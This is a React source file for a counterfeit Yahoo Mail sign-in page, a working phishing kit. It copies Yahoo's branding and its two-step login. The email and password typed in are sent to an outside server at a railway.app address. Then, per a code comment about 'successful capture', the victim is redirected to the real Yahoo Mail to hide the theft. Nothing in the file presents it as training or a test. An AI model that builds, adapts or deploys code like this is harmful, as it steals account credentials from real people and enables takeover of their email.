/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ChevronLeft, HelpCircle } from 'lucide-react';

// Mock service to "detect" emails
const emailDetectionService = {
  getDetectedEmails: () => {
    const stored = localStorage.getItem('yahoo_detected_emails');
    return stored ? JSON.parse(stored) : ['abcd@yahoo.com', 'work@yahoo.com'];
  },
  saveEmail: (email: string) => {
    const emails = emailDetectionService.getDetectedEmails();
    if (!emails.includes(email)) {
      localStorage.setItem('yahoo_detected_emails', JSON.stringify([...emails, email]));
    }
  }
};

export default function App() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [detectedEmails, setDetectedEmails] = useState<string[]>([]);

  useEffect(() => {
    setDetectedEmails(emailDetectionService.getDetectedEmails());
  }, []);

  // ====================== HANDLE EMAIL STEP ======================
  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (response.ok && data.attemptId) {
        setAttemptId(data.attemptId);
        emailDetectionService.saveEmail(email);
        setStep(2);
      } else {
        setError(data.message || 'Failed to process email. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Make sure backend is running on port 3000.');
    } finally {
      setIsLoading(false);
    }
  };

  // ====================== HANDLE PASSWORD STEP ======================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || !attemptId) return;

    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('https://demascus-production-b89b.up.railway.app/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ attemptId, password }),
      });

      if (response.ok) {
        // Redirect to real Yahoo after successful capture
        window.location.href = "https://mail.yahoo.com";
      } else {
        const data = await response.json().catch(() => ({}));
        setError(data.message || 'Invalid password. Please try again.');
      }
    } catch (err) {
      console.error(err);
      setError('Cannot connect to server. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    setStep(1);
    setPassword('');
    setError('');
  };

  const YahooLogo = ({ className = "w-24" }: { className?: string }) => (
    <svg viewBox="0 0 100 24" className={className} fill="#6001d2">
      <text x="0" y="20" fontFamily="Arial Black, sans-serif" fontSize="24" fontWeight="900" letterSpacing="-1">yahoo!</text>
    </svg>
  );

  return (
    <div className="min-h-screen bg-white font-sans text-[#26282a]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 md:px-12">
        <YahooLogo className="w-24 md:w-28" />
        <nav className="flex items-center gap-4 text-sm font-medium text-[#6001d2]">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </nav>
      </header>

      <main className="mx-auto flex max-w-7xl flex-col items-center justify-center px-6 py-8 md:flex-row md:items-start md:gap-16 md:py-20 lg:gap-24">
        {/* Left Content */}
        <div className="hidden max-w-md md:block">
          <h1 className="mb-6 text-[28px] font-bold leading-tight text-[#26282a] lg:text-[32px]">
            With Yahoo, you can enjoy what matters most to you even more easily.
          </h1>
          <p className="text-lg leading-relaxed text-[#26282a]">
            The excellent Yahoo Mail, the latest local, national, and world news, financial, sports, music, movies, and more.
          </p>
        </div>

        {/* Login Card */}
        <div className="w-full max-w-[420px]">
          <div className="relative overflow-hidden rounded-[12px] bg-white p-8 shadow-[0_2px_12px_rgba(0,0,0,0.12)] md:p-10">
            <div className="mb-8 flex flex-col items-center">
              <YahooLogo className="mb-6 w-24" />
              <h2 className="text-xl font-bold text-[#26282a]">
                {step === 1 ? 'Signing in to Yahoo Mail' : 'Enter password'}
              </h2>
              <p className="mt-1 text-sm text-[#26282a]">
                {step === 1 ? 'with your Yahoo account' : 'to finish signing in'}
              </p>
            </div>

            {error && (
              <p className="mb-4 text-center text-sm text-red-600 bg-red-50 p-3 rounded-lg">{error}</p>
            )}

            <AnimatePresence mode="wait">
              {step === 1 ? (
                <motion.form
                  key="step1"
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  transition={{ duration: 0.3 }}
                  onSubmit={handleNext}
                  className="space-y-6"
                >
                  <div className="relative">
                    <input
                      type="text"
                      id="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Username, email or mobile"
                      className="peer w-full border-b-2 border-[#d8d8d8] py-2 text-base outline-none transition-colors focus:border-[#6001d2]"
                      required
                      autoFocus
                      list="detected-emails"
                    />
                    <datalist id="detected-emails">
                      {detectedEmails.map((e) => (
                        <option key={e} value={e} />
                      ))}
                    </datalist>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="flex w-full items-center justify-center rounded-full bg-[#6001d2] py-3.5 text-base font-bold text-white transition-colors hover:bg-[#4a00a3] disabled:opacity-70"
                  >
                    {isLoading ? (
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                    ) : (
                      'Next'
                    )}
                  </button>

                  <div className="flex items-center justify-between text-sm">
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input type="checkbox" className="h-4 w-4 rounded border-[#d8d8d8] text-[#6001d2] focus:ring-[#6001d2]" defaultChecked />
                      <span className="text-[#6001d2]">Stay logged in</span>
                    </label>
                    <a href="#" className="font-medium text-[#6001d2] hover:underline">Forgot username?</a>
                  </div>

                  <div className="pt-4">
                    <button
                      type="button"
                      className="w-full rounded-full border border-[#6001d2] py-3 text-base font-bold text-[#6001d2] transition-colors hover:bg-[#6001d2]/5"
                    >
                      Create account
                    </button>
                  </div>

                  <div className="relative flex items-center justify-center py-2">
                    <div className="absolute inset-0 flex items-center">
                      <div className="w-full border-t border-[#d8d8d8]"></div>
                    </div>
                    <span className="relative bg-white px-4 text-sm text-[#6e7376]">or</span>
                  </div>

                  <button
                    type="button"
                    className="flex w-full items-center justify-center gap-3 rounded-full border border-[#d8d8d8] py-3 text-base font-medium text-[#26282a] transition-colors hover:bg-gray-50"
                  >
                    <svg className="h-5 w-5" viewBox="0 0 24 24">
                      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-1 .67-2.28 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                      <path d="M5.84 14.09c-.22-.67-.35-1.39-.35-2.09s.13-1.42.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" />
                      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
                    </svg>
                    Sign in with Google
                  </button>
                </motion.form>
              ) : (
                <motion.form
                  key="step2"
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  transition={{ duration: 0.3 }}
                  onSubmit={handleSubmit}
                  className="space-y-6"
                >
                  <div className="flex items-center justify-between rounded-full bg-gray-50 px-4 py-2">
                    <span className="truncate text-sm font-medium text-[#26282a]">{email}</span>
                    <button
                      type="button"
                      onClick={handleBack}
                      className="text-sm font-bold text-[#6001d2] hover:underline"
                    >
                      Edit
                    </button>
                  </div>

                  <div className="relative">
                    <input
                      type="password"
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="peer w-full border-b-2 border-[#d8d8d8] py-2 text-base outline-none transition-colors focus:border-[#6001d2]"
                      required
                      autoFocus
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="flex w-full items-center justify-center rounded-full bg-[#6001d2] py-3.5 text-base font-bold text-white transition-colors hover:bg-[#4a00a3] disabled:opacity-70"
                  >
                    {isLoading ? (
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                    ) : (
                      'Next'
                    )}
                  </button>

                  <div className="flex items-center justify-center text-sm">
                    <a href="#" className="font-medium text-[#6001d2] hover:underline">Forgot password?</a>
                  </div>
                </motion.form>
              )}
            </AnimatePresence>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto flex flex-wrap items-center justify-center gap-6 px-6 py-8 text-xs text-[#6e7376]">
        <a href="#" className="hover:underline">Help</a>
        <a href="#" className="hover:underline">Terms</a>
        <a href="#" className="hover:underline">Privacy</a>
        <span>© 2026 Yahoo</span>
      </footer>
    </div>
  );
}
